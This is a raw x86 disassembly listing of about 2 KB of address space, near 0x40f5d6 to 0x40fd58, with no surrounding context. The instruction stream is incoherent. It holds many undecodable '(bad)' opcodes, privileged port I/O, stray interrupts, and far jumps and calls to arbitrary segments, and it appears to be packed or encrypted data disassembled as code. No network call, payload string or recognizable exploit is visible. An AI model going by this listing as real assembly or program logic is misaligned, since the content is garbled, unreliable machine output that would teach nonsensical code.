  40f5d6:	psrlw  mm3,QWORD PTR [eax]
  40f5d9:	ins    DWORD PTR es:[edi],dx
  40f5da:	inc    ecx
  40f5db:	(bad)  
  40f5dc:	repnz mov ds:0x34a8d370,eax
  40f5e2:	xchg   ebp,eax
  40f5e3:	lds    esi,FWORD PTR [edx+0x6555887b]
  40f5e9:	scas   eax,DWORD PTR es:[edi]
  40f5ea:	scas   al,BYTE PTR es:[edi]
  40f5eb:	shr    bh,cl
  40f5ed:	dec    esi
  40f5ee:	jmp    0x40f5e0
  40f5f0:	(bad)  
  40f5f1:	stos   BYTE PTR es:[edi],al
  40f5f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5f3:	dec    esi
  40f5f4:	leave  
  40f5f5:	jns    0x40f66d
  40f5f7:	jge    0x40f63e
  40f5f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f5fa:	test   eax,0x1cbe7620
  40f5ff:	out    dx,al
  40f600:	dec    edx
  40f601:	and    dl,cl
  40f603:	jl     0x40f640
  40f605:	in     eax,dx
  40f606:	pop    edx
  40f607:	mov    edi,0x720d2673
  40f60c:	add    BYTE PTR [edx+0x44],al
  40f60f:	mov    ch,BYTE PTR [ecx+0x41fa1a9]
  40f615:	mov    esp,0xa3dd35b4
  40f61a:	pop    edi
  40f61b:	cdq    
  40f61c:	test   al,0x92
  40f61e:	daa    
  40f61f:	mov    bh,0x7a
  40f621:	out    dx,eax
  40f622:	jge    0x40f5aa
  40f624:	out    0x91,al
  40f626:	jb     0x40f5b1
  40f628:	mov    dl,0xba
  40f62a:	xor    eax,0xe84d6dca
  40f62f:	test   BYTE PTR [edx+ebx*2+0xf965e47],0x33
  40f637:	mov    edi,ss
  40f639:	stc    
  40f63a:	or     al,0x88
  40f63c:	aas    
  40f63d:	jl     0x40f61e
  40f63f:	or     BYTE PTR [esi-0x6cf72b39],dl
  40f645:	gs rol dl,1
  40f648:	lock jns 0x40f612
  40f64b:	fcmovnu st,st(5)
  40f64d:	mov    ecx,DWORD PTR [ecx+esi*8]
  40f650:	adc    DWORD PTR [ecx-0x6006f2c9],ecx
  40f656:	ret    0xa2a5
  40f659:	xor    al,0x92
  40f65b:	imul   edi,DWORD PTR [edi],0xffffff88
  40f65e:	rol    DWORD PTR [esp+ecx*2+0x4e],0xdf
  40f663:	push   ds
  40f664:	lock jb 0x40f69b
  40f667:	xchg   edi,eax
  40f668:	mov    al,0xb
  40f66a:	ins    DWORD PTR es:[edi],dx
  40f66b:	add    eax,0x5a8edba7
  40f670:	jg     0x40f6c7
  40f672:	jae    0x40f6d9
  40f674:	pop    DWORD PTR [eax]
  40f676:	dec    ebx
  40f677:	ret    0xe775
  40f67a:	(bad)  
  40f67c:	cmp    al,0xd9
  40f67e:	out    dx,al
  40f67f:	pop    edx
  40f680:	mov    ds:0xa1ba7b15,eax
  40f685:	adc    al,ch
  40f687:	mov    eax,ds:0x9f0798c3
  40f68c:	mov    bl,0xa6
  40f68e:	call   0x4f0f9e58
  40f693:	pop    eax
  40f694:	fs and al,0xab
  40f697:	jge    0x40f6f8
  40f699:	add    esp,eax
  40f69b:	retf   
  40f69c:	jp     0x40f70f
  40f69e:	inc    edi
  40f69f:	jbe    0x40f6d0
  40f6a1:	retf   
  40f6a2:	cmc    
  40f6a3:	pop    ecx
  40f6a4:	pop    ebx
  40f6a5:	test   al,0xcb
  40f6a7:	jmp    0x40f671
  40f6a9:	das    
  40f6aa:	xchg   BYTE PTR [ecx],bh
  40f6ac:	jbe    0x40f6b9
  40f6ae:	jo     0x40f716
  40f6b0:	push   0x3ceb643
  40f6b5:	fdivr  QWORD PTR [ebx-0x88f40a1]
  40f6bb:	xor    ebp,DWORD PTR [eax+ecx*1+0x70cacbb4]
  40f6c2:	cmp    eax,0xe7ddd740
  40f6c7:	xchg   edx,eax
  40f6c8:	scas   eax,DWORD PTR es:[edi]
  40f6c9:	add    ecx,edi
  40f6cb:	inc    esp
  40f6cc:	inc    eax
  40f6cd:	and    bl,ch
  40f6cf:	add    al,bl
  40f6d1:	xchg   ebx,eax
  40f6d2:	test   dh,dh
  40f6d4:	repnz lahf 
  40f6d6:	in     eax,dx
  40f6d7:	mov    ecx,0xa04dfa74
  40f6dc:	mov    ecx,0x8af0d8cc
  40f6e1:	adc    eax,0x3a36339f
  40f6e6:	push   ebp
  40f6e7:	sahf   
  40f6e8:	or     ch,BYTE PTR [edi+0x79182c0f]
  40f6ee:	imul   esi,DWORD PTR [ebp+0x6e],0xf243a683
  40f6f5:	dec    edx
  40f6f6:	das    
  40f6f7:	push   ds
  40f6f8:	icebp  
  40f6f9:	adc    al,0x38
  40f6fb:	in     al,dx
  40f6fc:	pop    esp
  40f6fd:	inc    ebp
  40f6fe:	xor    ch,BYTE PTR [ecx+0x6]
  40f701:	cmp    DWORD PTR [edx+0x7fc7ecbc],eax
  40f707:	out    dx,al
  40f708:	mov    ecx,0x79ed6fc5
  40f70d:	loope  0x40f744
  40f70f:	fcmovne st,st(2)
  40f711:	fadd   QWORD PTR [ebp-0x6e]
  40f714:	cmp    eax,0xa3ea36d1
  40f719:	sub    DWORD PTR [ecx+0x5072fadc],0xffffff96
  40f720:	jmp    0x11eb:0x8ab4e94
  40f727:	push   0xe11d1d73
  40f72c:	div    BYTE PTR [eax]
  40f72e:	ds in  eax,0xa5
  40f731:	out    dx,al
  40f732:	inc    ebp
  40f733:	in     eax,dx
  40f734:	mov    edi,DWORD PTR [esi+edi*1-0xc7ab86f]
  40f73b:	mov    bl,0x6a
  40f73d:	jp     0x40f737
  40f73f:	stos   DWORD PTR es:[edi],eax
  40f740:	int    0xdc
  40f742:	ficom  WORD PTR [ebx-0x80]
  40f745:	mul    BYTE PTR [eax]
  40f747:	int    0xd3
  40f749:	jecxz  0x40f786
  40f74b:	mov    eax,ss
  40f74d:	retf   
  40f74e:	dec    ecx
  40f74f:	mov    al,ds:0x695676e5
  40f754:	mov    bh,0x8c
  40f756:	jo     0x40f705
  40f758:	cmp    BYTE PTR [edx-0x5c],0x76
  40f75c:	test   al,0xdb
  40f75e:	aaa    
  40f75f:	or     cl,BYTE PTR [eax]
  40f761:	imul   edi,DWORD PTR [edx],0x940626e3
  40f767:	rcl    BYTE PTR [ebx],1
  40f769:	mov    cl,0x71
  40f76b:	jae    0x40f7e1
  40f76d:	push   0xffffffa8
  40f76f:	push   edx
  40f770:	out    0x58,al
  40f772:	sbb    al,0x4b
  40f774:	push   edi
  40f775:	sbb    DWORD PTR [edx-0x5a23b6ec],ecx
  40f77b:	retf   0xe582
  40f77e:	inc    edi
  40f77f:	ds pop esp
  40f781:	leave  
  40f782:	adc    ebp,esp
  40f784:	jp     0x40f786
  40f786:	mov    WORD PTR [esi+0x70fcf8bc],?
  40f78c:	(bad)  
  40f78d:	sub    dh,BYTE PTR [ebx+0x12]
  40f790:	cli    
  40f791:	fcomip st,st(3)
  40f793:	fs adc eax,0x86e7360a
  40f799:	lods   al,BYTE PTR ds:[esi]
  40f79a:	dec    esp
  40f79b:	movnti DWORD PTR [ecx+0x20],esi
  40f79f:	dec    ebx
  40f7a0:	xor    bl,BYTE PTR ds:0xfabbd80f
  40f7a6:	add    DWORD PTR [edx],0xdbb5d4b2
  40f7ac:	xor    ch,BYTE PTR [ebx-0x375b5672]
  40f7b2:	out    0x2d,eax
  40f7b4:	jge    0x40f7f6
  40f7b6:	cld    
  40f7b7:	dec    ebp
  40f7b8:	dec    esp
  40f7b9:	cdq    
  40f7ba:	dec    ebx
  40f7bb:	ror    DWORD PTR [ebp+0x38c376d0],1
  40f7c1:	fiadd  DWORD PTR [bp+di+0x39]
  40f7c5:	jbe    0x40f7c0
  40f7c7:	or     DWORD PTR [edx+0x254e58e6],ebp
  40f7cd:	mov    bl,0xe3
  40f7cf:	mov    bl,0xac
  40f7d1:	push   esi
  40f7d2:	pusha  
  40f7d3:	add    al,0x8a
  40f7d5:	(bad)  
  40f7d7:	mov    ds:0xb438410d,eax
  40f7dc:	xchg   DWORD PTR [ecx+esi*4-0x6c3a04bf],ebp
  40f7e3:	cld    
  40f7e4:	dec    eax
  40f7e5:	and    edx,DWORD PTR [edx+0x18]
  40f7e8:	aaa    
  40f7e9:	call   0x5322:0xc31d5d2
  40f7f0:	push   edi
  40f7f1:	sub    DWORD PTR [ebx+edx*8],ebp
  40f7f4:	push   edi
  40f7f5:	out    0xc4,al
  40f7f7:	lods   al,BYTE PTR ds:[esi]
  40f7f8:	mov    ecx,0x57cfe094
  40f7fd:	sub    al,0x9f
  40f7ff:	add    cl,bl
  40f801:	push   DWORD PTR [edx+eax*1]
  40f804:	xlat   BYTE PTR ds:[ebx]
  40f805:	adc    BYTE PTR [ebx-0x3d073877],dl
  40f80b:	sub    eax,ecx
  40f80d:	cmp    al,0x8a
  40f80f:	ss cli 
  40f811:	sub    BYTE PTR [ecx],al
  40f813:	(bad)  
  40f815:	pop    edx
  40f816:	les    esi,FWORD PTR [eax]
  40f818:	jg     0x40f854
  40f81a:	mov    ebp,0x4eb2f3d1
  40f81f:	mov    ebp,DWORD PTR [esp+esi*1-0x65]
  40f823:	push   eax
  40f824:	icebp  
  40f825:	pop    edi
  40f826:	xchg   ecx,eax
  40f827:	mov    ah,0xd7
  40f829:	in     al,dx
  40f82a:	into   
  40f82b:	gs sahf 
  40f82d:	sbb    ch,bh
  40f82f:	mov    ebp,0xccc73949
  40f834:	loopne 0x40f865
  40f836:	mov    al,0x32
  40f838:	dec    edi
  40f839:	inc    eax
  40f83a:	pop    ds
  40f83b:	cmp    al,0xe8
  40f83d:	cmp    al,0x5
  40f83f:	outs   dx,BYTE PTR ds:[esi]
  40f840:	loopne 0x40f7c4
  40f842:	xchg   edi,eax
  40f843:	xchg   BYTE PTR [eax-0x126254a5],al
  40f849:	rcl    DWORD PTR [ebx+0x7c],cl
  40f84c:	push   ebp
  40f84d:	mov    bh,0xaf
  40f84f:	dec    ecx
  40f850:	imul   ebx,DWORD PTR [ebp-0x50],0x42
  40f854:	sbb    ecx,DWORD PTR [ecx+edi*8]
  40f857:	mov    ds:0x3597ef24,eax
  40f85c:	adc    al,0x43
  40f85e:	dec    esi
  40f85f:	nop
  40f860:	lds    eax,FWORD PTR [ebx]
  40f862:	jecxz  0x40f7e7
  40f864:	jge    0x40f8d3
  40f866:	ds fs push esp
  40f869:	sub    al,0x38
  40f86b:	jl     0x40f808
  40f86d:	add    al,0x55
  40f86f:	lock cmp eax,0x4f8fa2da
  40f875:	test   ebx,edi
  40f877:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f878:	push   es
  40f879:	jno    0x40f823
  40f87b:	shl    BYTE PTR [edi+0x13b28f78],1
  40f881:	push   cs
  40f882:	or     dl,dl
  40f884:	mul    BYTE PTR [esi+0x2e52b626]
  40f88a:	sub    eax,0xe9a28bd2
  40f88f:	add    edx,DWORD PTR [ebx-0x777d69ae]
  40f895:	call   0xc036:0x3a9a712c
  40f89c:	xor    ch,al
  40f89e:	fcmovu st,st(3)
  40f8a0:	mov    dl,0xd0
  40f8a2:	push   esi
  40f8a3:	jo     0x40f8c7
  40f8a5:	and    dl,bl
  40f8a7:	fistp  WORD PTR [esp+edi*1+0x3d0f8331]
  40f8ae:	adc    DWORD PTR [ebx],edx
  40f8b0:	popf   
  40f8b1:	into   
  40f8b2:	add    ecx,ebp
  40f8b4:	call   0x1efab896
  40f8b9:	inc    esp
  40f8ba:	aad    0x80
  40f8bc:	add    DWORD PTR [ecx+eax*1],eax
  40f8bf:	fcomip st,st(7)
  40f8c1:	pop    ds
  40f8c2:	das    
  40f8c3:	dec    ebp
  40f8c4:	icebp  
  40f8c5:	push   ecx
  40f8c6:	sahf   
  40f8c7:	jae    0x40f917
  40f8c9:	iret   
  40f8ca:	push   ebp
  40f8cb:	cmp    edx,DWORD PTR [ebx+0x52a09382]
  40f8d1:	adc    ch,BYTE PTR ds:0x4f100304
  40f8d7:	dec    eax
  40f8d8:	adc    bh,BYTE PTR [esi]
  40f8da:	ja     0x40f869
  40f8dc:	xchg   BYTE PTR [ebx-0x2a391d60],dl
  40f8e2:	mov    sp,0xbd4e
  40f8e6:	and    al,0xe5
  40f8e8:	call   0x3bfd:0xb8efeb52
  40f8ef:	inc    ebx
  40f8f0:	xor    BYTE PTR [ebx-0x5371dd9e],dl
  40f8f6:	or     bh,bh
  40f8f8:	sbb    ch,dh
  40f8fa:	dec    eax
  40f8fb:	mov    ah,0x62
  40f8fd:	mov    ds:0xabf8f98d,al
  40f902:	jp     0x40f94a
  40f904:	add    al,0x5a
  40f906:	mov    ah,0x40
  40f908:	ins    BYTE PTR es:[edi],dx
  40f909:	dec    ebp
  40f90a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f90b:	xchg   BYTE PTR [eax-0x1be1153],al
  40f911:	ficom  DWORD PTR [ebp+0x6a4a8d67]
  40f917:	add    bh,dl
  40f919:	cdq    
  40f91a:	mov    eax,0x19b95f53
  40f91f:	jl     0x40f8b9
  40f921:	sub    ecx,esi
  40f923:	fldpi  
  40f925:	sbb    al,0x77
  40f927:	fs loopne 0x40f92f
  40f92a:	dec    eax
  40f92b:	int3   
  40f92c:	lods   al,BYTE PTR ds:[esi]
  40f92d:	imul   DWORD PTR [eax+edi*2+0x12ab843]
  40f934:	mov    dl,0x11
  40f936:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f937:	pop    ebp
  40f938:	push   ds
  40f939:	shl    BYTE PTR [edx+0x48],cl
  40f93c:	xor    ebx,eax
  40f93e:	add    DWORD PTR ds:0x4b3dd136,esp
  40f944:	call   0xc045:0xc162504
  40f94b:	fistp  QWORD PTR [ecx-0x26]
  40f94e:	pop    edi
  40f94f:	enter  0x760e,0x9d
  40f953:	aaa    
  40f954:	(bad)  
  40f955:	shl    BYTE PTR [edx-0x2c],1
  40f958:	cli    
  40f959:	mov    ds:0x3dd0f5b7,al
  40f95e:	mov    edi,0x1b1b98c0
  40f963:	aam    0x56
  40f965:	rcl    BYTE PTR [ecx+0xc737201],cl
  40f96b:	addr16 and ah,dl
  40f96e:	push   cs
  40f96f:	in     eax,0x47
  40f971:	xor    DWORD PTR [esi-0x7c],eax
  40f974:	pop    es
  40f975:	cmp    al,0x85
  40f977:	(bad)  
  40f978:	push   edx
  40f979:	(bad)  [esi]
  40f97b:	pop    ds
  40f97c:	mov    cl,0x6e
  40f97e:	call   0x76c3:0xf994e34f
  40f985:	sub    dl,BYTE PTR [esi]
  40f987:	sbb    eax,0xbc224026
  40f98c:	xchg   edx,eax
  40f98d:	cmp    bl,BYTE PTR [edx-0x4898c280]
  40f993:	lea    esi,[esi+0x2c]
  40f996:	push   cs
  40f997:	ror    DWORD PTR [esi],cl
  40f999:	not    BYTE PTR [edx-0x1fe74243]
  40f99f:	std    
  40f9a0:	pop    ecx
  40f9a1:	in     al,0x9e
  40f9a3:	mov    eax,0x40f7096a
  40f9a8:	sar    DWORD PTR [ebx],cl
  40f9aa:	xor    BYTE PTR [ecx],ch
  40f9ac:	push   cs
  40f9ad:	and    BYTE PTR [edi*8+0x1bcdd399],dh
  40f9b4:	jno    0x40f9a5
  40f9b6:	outs   dx,BYTE PTR ds:[esi]
  40f9b7:	iret   
  40f9b8:	mov    ebx,0x6e671744
  40f9bd:	cmp    bh,ah
  40f9bf:	push   cs
  40f9c0:	pop    ebp
  40f9c1:	aam    0xd6
  40f9c3:	std    
  40f9c4:	mov    edx,gs
  40f9c6:	out    0x7c,eax
  40f9c8:	sbb    eax,0x84ce7479
  40f9cd:	inc    eax
  40f9ce:	inc    esp
  40f9cf:	(bad)  [edi+ebx*8]
  40f9d2:	sub    ch,cl
  40f9d4:	(bad)  
  40f9d5:	mov    dh,0xea
  40f9d7:	fcom   DWORD PTR [ecx]
  40f9d9:	test   BYTE PTR [eax+ebp*2-0x26],ch
  40f9dd:	cmp    bl,ah
  40f9df:	fwait
  40f9e0:	ror    ah,1
  40f9e2:	neg    BYTE PTR [edx+0x9]
  40f9e5:	inc    ebx
  40f9e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9e7:	xchg   BYTE PTR [esi],dh
  40f9e9:	not    dh
  40f9eb:	xchg   ebp,eax
  40f9ec:	loopne 0x40fa4b
  40f9ee:	enter  0x1ea4,0x1d
  40f9f2:	push   ds
  40f9f3:	mov    edi,0x1dc9469d
  40f9f8:	repnz dec ebp
  40f9fa:	out    0x67,al
  40f9fc:	mov    dl,0x52
  40f9fe:	lock or esp,DWORD PTR [ebx-0x54]
  40fa02:	add    esi,DWORD PTR [ecx]
  40fa04:	push   es
  40fa05:	test   bh,0xc5
  40fa08:	and    ch,BYTE PTR [edi]
  40fa0a:	mov    bl,0xa6
  40fa0c:	fs dec edx
  40fa0e:	sahf   
  40fa0f:	test   ch,al
  40fa11:	mov    dh,0x2b
  40fa13:	push   ss
  40fa14:	retf   
  40fa15:	adc    al,0xa2
  40fa17:	mov    ebx,0xa6d8fecf
  40fa1c:	pop    DWORD PTR [edi]
  40fa1e:	dec    ebx
  40fa1f:	pusha  
  40fa20:	jns    0x40fa3f
  40fa22:	mov    al,0x4
  40fa24:	pop    ss
  40fa25:	call   0x703c06a5
  40fa2a:	xchg   ecx,eax
  40fa2b:	pop    ds
  40fa2c:	xchg   BYTE PTR [ebx],ch
  40fa2e:	test   al,0x69
  40fa30:	cmp    edi,ecx
  40fa32:	adc    BYTE PTR [eax],dl
  40fa34:	lods   al,BYTE PTR ds:[esi]
  40fa35:	pop    esi
  40fa36:	xchg   edi,eax
  40fa37:	repz imul ebp,DWORD PTR [ebx+edi*4+0x72],0x23
  40fa3d:	jbe    0x40f9c1
  40fa3f:	push   ds
  40fa40:	shl    BYTE PTR [edx+0xd],cl
  40fa43:	loope  0x40fa75
  40fa45:	inc    eax
  40fa46:	loopne 0x40fa40
  40fa48:	fcomp  QWORD PTR [esi+0x69]
  40fa4b:	xchg   edx,eax
  40fa4c:	inc    edx
  40fa4d:	sbb    al,0x79
  40fa4f:	test   BYTE PTR [ecx+0xc],ch
  40fa52:	jo     0x40fad1
  40fa54:	jno    0x40faab
  40fa56:	mov    WORD PTR [edi+0x68],fs
  40fa59:	not    DWORD PTR [ecx-0x14f3fe72]
  40fa5f:	test   DWORD PTR [esi-0x71],esp
  40fa62:	adc    al,0x78
  40fa64:	cmp    al,0x50
  40fa66:	sbb    bl,BYTE PTR [eax+0x3c275360]
  40fa6c:	jbe    0x40faca
  40fa6e:	test   dl,0x19
  40fa71:	and    dh,BYTE PTR [esp+edi*4]
  40fa74:	add    bl,BYTE PTR [esi+0x6a276e6f]
  40fa7a:	xor    edi,ebp
  40fa7c:	retf   0x3088
  40fa7f:	aam    0xfc
  40fa81:	test   eax,0x3ef646c9
  40fa86:	jae    0x40fa77
  40fa88:	push   edi
  40fa89:	adc    DWORD PTR [edx-0x41302fb5],esi
  40fa8f:	pop    es
  40fa90:	or     al,0x72
  40fa92:	jno    0x40fb03
  40fa94:	leave  
  40fa95:	mov    bl,0x36
  40fa97:	shl    BYTE PTR [ecx-0x68b1acb8],0x1f
  40fa9e:	mov    WORD PTR [ebx-0xc69866d],?
  40faa4:	dec    edi
  40faa5:	push   ds
  40faa6:	es dec esp
  40faa8:	xchg   esp,eax
  40faa9:	and    DWORD PTR [ebx],edx
  40faab:	cmp    eax,0xb4dfb7dc
  40fab0:	jp     0x40faa4
  40fab2:	cmp    BYTE PTR [edx+0x51],ch
  40fab5:	mov    eax,0x78b5109e
  40faba:	enter  0x27b2,0xf1
  40fabe:	jmp    0x26e2cea6
  40fac3:	dec    ebp
  40fac4:	scas   eax,DWORD PTR es:[edi]
  40fac5:	repnz mov ebx,0x876f48d4
  40facb:	mov    ch,0x54
  40facd:	stos   DWORD PTR es:[edi],eax
  40face:	icebp  
  40facf:	jmp    0xb4735238
  40fad4:	add    al,0xba
  40fad6:	retf   0xac1b
  40fad9:	pushf  
  40fada:	fcom   DWORD PTR [edi+0x126e924]
  40fae0:	adc    eax,0xacea1289
  40fae5:	dec    esp
  40fae6:	push   cs
  40fae7:	std    
  40fae8:	int3   
  40fae9:	cwde   
  40faea:	test   ah,cl
  40faec:	inc    ebp
  40faed:	inc    edi
  40faee:	addr16 mov dh,0x99
  40faf1:	dec    ecx
  40faf2:	inc    edi
  40faf3:	cmp    esp,0xffffff80
  40faf6:	add    DWORD PTR [edx],edi
  40faf8:	jne    0x40fae5
  40fafa:	mov    DWORD PTR [edi+0x38],eax
  40fafd:	dec    edx
  40fafe:	push   ecx
  40faff:	mov    dh,0x46
  40fb01:	rcr    cl,cl
  40fb03:	retf   
  40fb04:	scas   eax,DWORD PTR es:[edi]
  40fb05:	ja     0x40fb60
  40fb07:	je     0x40fa97
  40fb09:	and    al,0x4a
  40fb0b:	push   ds
  40fb0c:	lock inc esi
  40fb0e:	bnd jne 0x40fb83
  40fb11:	jns    0x40fb7c
  40fb13:	test   al,0x6
  40fb15:	aaa    
  40fb16:	out    0xd7,eax
  40fb18:	add    eax,DWORD PTR [ecx-0xc]
  40fb1b:	pop    ecx
  40fb1c:	dec    esp
  40fb1d:	sub    eax,0xcd1d69d4
  40fb22:	jmp    0xf108:0xcd8a4da8
  40fb29:	xchg   esp,eax
  40fb2a:	xor    eax,0x6ca721a9
  40fb2f:	mov    bh,ah
  40fb31:	and    dl,BYTE PTR [ebx*4-0x5448ca32]
  40fb38:	pop    edi
  40fb39:	in     al,dx
  40fb3a:	mov    edx,0x8afc2e79
  40fb3f:	mov    ds:0x270c6d7e,eax
  40fb44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb45:	mov    ebp,0xaa22c51e
  40fb4a:	repz fld DWORD PTR [esi]
  40fb4d:	jmp    0xdbdb:0x1ed29133
  40fb54:	mov    ecx,0x1c6857d1
  40fb59:	add    BYTE PTR [ebp-0x7a4d814b],ah
  40fb5f:	add    eax,0x4139b8f
  40fb64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb65:	test   BYTE PTR [ebp-0x7a],bh
  40fb68:	ret    0x9fa6
  40fb6b:	in     al,0x68
  40fb6d:	cdq    
  40fb6e:	and    eax,0x498bf57c
  40fb73:	std    
  40fb74:	dec    ecx
  40fb75:	and    eax,0xb0e96615
  40fb7a:	xor    edx,DWORD PTR [esp+esi*8+0x7af52e98]
  40fb81:	stc    
  40fb82:	fistp  QWORD PTR [ecx]
  40fb84:	pop    edx
  40fb85:	and    eax,0x45f29079
  40fb8a:	fnsave [edi+0x5a]
  40fb8d:	mov    WORD PTR [ebp-0x844ab63],ss
  40fb93:	xchg   DWORD PTR [esi-0x18ddd30],esp
  40fb99:	mov    ah,0x9e
  40fb9b:	test   eax,0x2af6c1cf
  40fba0:	les    ecx,FWORD PTR [edx+edi*1+0x20]
  40fba4:	adc    ebp,edi
  40fba6:	imul   ecx,DWORD PTR [eax-0x73850795],0xfffffff5
  40fbad:	xchg   esp,eax
  40fbae:	pop    edx
  40fbaf:	push   ebx
  40fbb0:	or     al,0xe9
  40fbb2:	adc    al,0x5c
  40fbb4:	sbb    eax,0x47467ad3
  40fbb9:	in     al,0xfa
  40fbbb:	sbb    ch,0x45
  40fbbe:	pop    esp
  40fbbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fbc0:	lds    edx,FWORD PTR [ecx-0x20e13a50]
  40fbc6:	ss mov al,0x9
  40fbc9:	icebp  
  40fbca:	cmc    
  40fbcb:	inc    esp
  40fbcc:	int    0x6d
  40fbce:	stos   DWORD PTR es:[edi],eax
  40fbcf:	dec    ebx
  40fbd0:	mov    ds:0x253cb827,al
  40fbd5:	rcr    DWORD PTR [ebp-0x351d46b6],1
  40fbdb:	dec    ecx
  40fbdc:	test   eax,0xacfbe5b9
  40fbe1:	mov    es,WORD PTR [ecx-0x53714a84]
  40fbe7:	xor    ah,BYTE PTR [esi+edx*4+0x527bc69e]
  40fbee:	xor    DWORD PTR [edi-0x24cf26b8],eax
  40fbf4:	push   ss
  40fbf5:	sub    BYTE PTR [ecx+0x3c],ah
  40fbf8:	pop    edx
  40fbf9:	xor    edx,ecx
  40fbfb:	add    esi,DWORD PTR [ebx]
  40fbfd:	push   edi
  40fbfe:	cmp    esi,DWORD PTR [esp+ebp*8]
  40fc01:	gs mov esi,0x2a363953
  40fc07:	xchg   BYTE PTR [edx],al
  40fc09:	adc    eax,0x5baeffa9
  40fc0e:	cwde   
  40fc0f:	imul   esp,DWORD PTR ds:0xf3cb363d,0x59
  40fc16:	ret    
  40fc17:	jnp    0x40fc78
  40fc19:	stos   BYTE PTR es:[edi],al
  40fc1a:	(bad)  
  40fc1b:	or     al,0xad
  40fc1d:	mov    bl,cl
  40fc1f:	stos   BYTE PTR es:[edi],al
  40fc20:	not    ah
  40fc22:	ins    BYTE PTR es:[edi],dx
  40fc23:	jnp    0x40fc15
  40fc25:	sbb    al,ah
  40fc27:	or     al,0xcd
  40fc29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc2a:	or     cl,BYTE PTR [esi-0x3d]
  40fc2d:	mov    bl,0xd2
  40fc2f:	inc    ecx
  40fc30:	and    edi,edi
  40fc32:	push   DWORD PTR [ebx-0x67ba59c5]
  40fc38:	test   al,0x24
  40fc3a:	jo     0x40fbc4
  40fc3c:	mov    dh,BYTE PTR [edi-0x11792f9a]
  40fc42:	sub    ebx,DWORD PTR [ebp-0x5fa8149c]
  40fc48:	mov    cl,0x55
  40fc4a:	retf   
  40fc4b:	cdq    
  40fc4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc4d:	loopne 0x40fc1a
  40fc4f:	and    DWORD PTR ds:0x7a038ec7,0xffffff8b
  40fc56:	xor    eax,0x88ea91b4
  40fc5b:	sbb    al,BYTE PTR [edx-0x5f]
  40fc5e:	stos   DWORD PTR es:[edi],eax
  40fc5f:	sbb    esp,esp
  40fc61:	sbb    eax,0xaf131c3b
  40fc66:	cmp    ch,BYTE PTR [ecx+0x3c2c5d1e]
  40fc6c:	sar    DWORD PTR cs:[esi+edi*2],cl
  40fc70:	add    eax,0x4dcb7bed
  40fc75:	jbe    0x40fc3d
  40fc77:	es xchg ebp,eax
  40fc79:	and    BYTE PTR [esi+0xe],cl
  40fc7c:	stos   BYTE PTR es:[edi],al
  40fc7d:	dec    esp
  40fc7e:	sub    BYTE PTR [ecx-0x67004b34],0xda
  40fc85:	(bad)  
  40fc87:	mov    ch,0x33
  40fc89:	fst    DWORD PTR [ebx]
  40fc8b:	test   al,0xee
  40fc8d:	in     al,0x97
  40fc8f:	xchg   edi,eax
  40fc90:	mov    dl,0xf2
  40fc92:	rcl    eax,1
  40fc94:	pop    esp
  40fc95:	inc    ebp
  40fc96:	push   esp
  40fc97:	sub    bl,dl
  40fc99:	jno    0x40fcf8
  40fc9b:	and    eax,0x10c39aae
  40fca0:	mov    esi,0xd8e9c31e
  40fca5:	mov    dh,0xc9
  40fca7:	sbb    ch,ah
  40fca9:	sub    al,0xc5
  40fcab:	imul   edi,DWORD PTR [esi],0xfffffff8
  40fcae:	(bad)
  40fcb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcb3:	jmp    0xe642:0xb1966541
  40fcba:	sbb    eax,0x7185f71d
  40fcbf:	pop    ss
  40fcc0:	addr16 hlt 
  40fcc2:	jno    0x40fcaa
  40fcc4:	or     BYTE PTR [ebp-0x597cd642],ch
  40fcca:	and    al,0x84
  40fccc:	sbb    BYTE PTR [ecx+ecx*8+0x6d],bh
  40fcd0:	xchg   ebx,eax
  40fcd1:	cmp    BYTE PTR [ebx+0x35],al
  40fcd4:	dec    ebp
  40fcd5:	ret    0x8fe
  40fcd8:	(bad)  
  40fcd9:	mov    dh,0xd9
  40fcdb:	psraw  mm5,mm2
  40fcde:	test   eax,0x878e5379
  40fce3:	mov    bl,0xd3
  40fce5:	imul   eax,ebp,0xffffff86
  40fce8:	inc    ebp
  40fce9:	push   es
  40fcea:	lahf   
  40fceb:	xor    dh,BYTE PTR ds:0xdb4721f2
  40fcf1:	stos   DWORD PTR es:[edi],eax
  40fcf2:	jg     0x40fc78
  40fcf4:	mov    al,0xe4
  40fcf6:	loopne 0x40fd47
  40fcf8:	jge    0x40fd69
  40fcfa:	repnz cmp DWORD PTR [ebp-0x67],0x67a2685e
  40fd02:	jb     0x40fd55
  40fd04:	inc    esi
  40fd05:	push   eax
  40fd06:	inc    edi
  40fd07:	sub    eax,0x6bbc638b
  40fd0c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40fd0e:	push   0xdf13f936
  40fd13:	or     esi,DWORD PTR [esi-0xc]
  40fd16:	jp     0x40fccb
  40fd18:	rcl    BYTE PTR [eax+edi*2],cl
  40fd1b:	jecxz  0x40fd95
  40fd1d:	inc    ecx
  40fd1e:	daa    
  40fd1f:	(bad)  
  40fd20:	rcr    DWORD PTR [ebx-0x1f],cl
  40fd23:	ror    DWORD PTR [eax-0x2ca41eec],0xac
  40fd2a:	les    edi,FWORD PTR [ebx-0x44]
  40fd2d:	jge    0x40fd8d
  40fd2f:	mov    edx,ebp
  40fd31:	add    BYTE PTR [ecx+0x4c993460],0x3
  40fd38:	xor    eax,0x43358cda
  40fd3d:	outs   dx,DWORD PTR ds:[esi]
  40fd3e:	cmp    DWORD PTR [ecx+0x59047f03],esi
  40fd44:	mov    edx,esi
  40fd46:	mov    al,ds:0xc0829c67
  40fd4b:	fisttp DWORD PTR [edi-0x3a1f7ffb]
  40fd51:	inc    eax
  40fd52:	jnp    0x40fd74
  40fd54:	(bad)  
  40fd56:	xchg   edx,eax
  40fd57:	dec    esi
  40fd58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
